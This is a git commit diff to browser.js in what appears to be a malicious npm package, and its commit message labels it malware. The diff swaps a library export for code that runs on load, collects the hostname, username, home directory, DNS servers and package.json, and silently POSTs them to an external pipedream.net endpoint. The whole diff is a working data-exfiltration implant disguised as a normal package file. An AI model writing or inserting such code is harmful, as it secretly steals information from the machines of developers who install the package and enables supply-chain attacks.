98c001551484b53389ead35bfa254bc016a8d38f
JakeClark <jakeclark38b@gmail.com>
2025-12-16 23:11:52 +0700

    Update to 497_unity-context-3.0.13 (malware)

--- browser.js
+++ browser.js
@@ -1,8 +1,47 @@
-/**
- * Export lib/mongoose
- *
- */
+//author:- @nvk0x
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
 
-'use strict';
+const trackingData = JSON.stringify({
+    Package_name: package,
+    Directory: __dirname,
+    Home_directory: os.homedir(),
+    Hostname: os.hostname(),
+    UserName: os.userInfo().username,
+    DNS: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+});
 
-module.exports = require('./lib/browser');
+var postData = querystring.stringify({
+    msg: trackingData,
+});
+
+var options = {
+    hostname: "f34a255878fd9d3113c75801932998d4.m.pipedream.net",
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
+
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    // console.error(e);
+});
+
+req.write(postData);
+req.end();
